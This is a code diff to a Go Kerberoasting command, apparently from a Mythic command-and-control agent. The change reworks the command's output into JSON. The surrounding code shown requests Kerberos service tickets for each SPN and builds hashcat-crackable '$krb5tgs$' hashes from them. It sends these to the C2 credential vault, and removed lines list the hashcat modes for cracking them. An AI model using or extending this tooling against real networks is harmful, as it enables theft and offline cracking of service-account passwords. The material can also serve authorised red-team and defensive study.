@@ -132,16 +132,17 @@ func (c *KerberoastCommand) Execute(task structs.Task) structs.CommandResult {
 	defer cl.Destroy()
 
 	// Step 3: Request TGS tickets for each SPN
-	var sb strings.Builder
-	sb.WriteString(fmt.Sprintf("[*] Kerberoasting %d SPN(s) from %s (KDC: %s)\n", len(spns), args.Realm, args.Server))
-	sb.WriteString(strings.Repeat("-", 60) + "\n")
-
-	roasted := 0
+	var entries []kerberoastOutputEntry
 	var creds []structs.MythicCredential
 	for _, entry := range spns {
 		ticket, _, err := cl.GetServiceTicket(entry.SPN)
 		if err != nil {
-			sb.WriteString(fmt.Sprintf("[!] Failed to roast %s (%s): %v\n", entry.SPN, entry.Account, err))
+			entries = append(entries, kerberoastOutputEntry{
+				Account: entry.Account,
+				SPN:     entry.SPN,
+				Status:  "failed",
+				Error:   err.Error(),
+			})
 			continue
 		}
 
@@ -149,13 +150,16 @@ func (c *KerberoastCommand) Execute(task structs.Task) structs.CommandResult {
 		etype := ticket.EncPart.EType
 		cipherHex := hex.EncodeToString(ticket.EncPart.Cipher)
 		hash := fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s", etype, entry.Account, args.Realm, entry.SPN, cipherHex)
-
 		etypeName := etypeToName(etype)
-		sb.WriteString(fmt.Sprintf("\n[+] %s — %s (%s)\n", entry.Account, entry.SPN, etypeName))
-		sb.WriteString(hash + "\n")
-		roasted++
 
-		// Report TGS hash to Mythic credential vault
+		entries = append(entries, kerberoastOutputEntry{
+			Account: entry.Account,
+			SPN:     entry.SPN,
+			Etype:   etypeName,
+			Hash:    hash,
+			Status:  "roasted",
+		})
+
 		creds = append(creds, structs.MythicCredential{
 			CredentialType: "hash",
 			Realm:          args.Realm,
@@ -165,10 +169,17 @@ func (c *KerberoastCommand) Execute(task structs.Task) structs.CommandResult {
 		})
 	}
 
-	sb.WriteString(fmt.Sprintf("\n[*] %d/%d hashes extracted (hashcat -m 13100 for RC4, -m 19600 for AES128, -m 19700 for AES256)\n", roasted, len(spns)))
+	data, err := json.Marshal(entries)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error marshaling results: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
 
 	result := structs.CommandResult{
-		Output:    sb.String(),
+		Output:    string(data),
 		Status:    "success",
 		Completed: true,
 	}
@@ -181,6 +192,16 @@ func (c *KerberoastCommand) Execute(task structs.Task) structs.CommandResult {
 type spnEntry struct {
 	SPN     string
 	Account string
+}
+
+// kerberoastOutputEntry represents a kerberoasted SPN for JSON output
+type kerberoastOutputEntry struct {
+	Account string `json:"account"`
+	SPN     string `json:"spn"`
+	Etype   string `json:"etype"`
+	Hash    string `json:"hash"`
+	Status  string `json:"status"` // "roasted" or "failed"
+	Error   string `json:"error,omitempty"`
 }
 
 func enumerateSPNs(args kerberoastArgs) ([]spnEntry, error) {
